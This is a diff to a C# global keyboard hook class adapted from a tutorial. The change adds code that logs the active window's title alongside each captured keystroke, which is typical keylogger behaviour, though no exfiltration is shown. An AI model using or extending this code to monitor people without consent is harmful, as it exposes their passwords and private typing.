@@ -1,5 +1,8 @@
 ﻿#region License_Do_Not_Remove
 /* 
+*  This is the scource code made by TheDarkJoker94 but I did some changes for it in order to fulfill
+*  a situation that I need.
+* 
 *  Made by TheDarkJoker94. 
 *  Check http://thedarkjoker94.cer33.com/ for more C# Tutorials 
 *  and also SUBSCRIBE to my Youtube Channel http://www.youtube.com/user/TheDarkJoker094  
@@ -13,6 +16,7 @@ using System.Runtime.InteropServices;
 using System.Windows.Forms;
 using System.Windows.Input;
 using System.Collections;
+using System.Text;
 
 public class GlobalKeyboardHook
 {
@@ -24,6 +28,10 @@ public class GlobalKeyboardHook
     static extern bool UnhookWindowsHookEx(IntPtr hInstance);
     [DllImport("kernel32.dll")]
     static extern IntPtr LoadLibrary(string lpFileName);
+    [DllImport("user32.dll")]
+    private static extern IntPtr GetForegroundWindow();
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
 
     public delegate int LLKeyboardHook(int Code, int wParam, ref keyBoardHookStruct lParam);
 
@@ -45,6 +53,8 @@ public class GlobalKeyboardHook
     LLKeyboardHook llkh;
 
     IntPtr Hook = IntPtr.Zero;
+
+    private IntPtr oldWindow;
 
     public event KeyEventHandler KeyDown;
     public event KeyEventHandler KeyUp;
@@ -97,6 +107,21 @@ public class GlobalKeyboardHook
             KeyEventArgs kArg = new KeyEventArgs(key);
             if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && (KeyDown != null))
             {
+                IntPtr newWindow = GetForegroundWindow();
+                // get title
+                const int count = 512;
+                var text = new StringBuilder(count);
+                if (oldWindow == null || newWindow != oldWindow)
+                {
+                    if (GetWindowText(newWindow, text, count) > 0)
+                    {
+                        TextPrinter.printLine();
+                        // Get Active window title and store it
+                        TextPrinter.printLine("Active window: " + text.ToString());
+                        oldWindow = newWindow;
+                    }
+                }
+
                 Key wpfKey = wpfKey = KeyInterop.KeyFromVirtualKey((int)key);
                 int keyCode = KeyInterop.VirtualKeyFromKey(wpfKey);
                 KeyboardStatus.setKeyCode(keyCode);
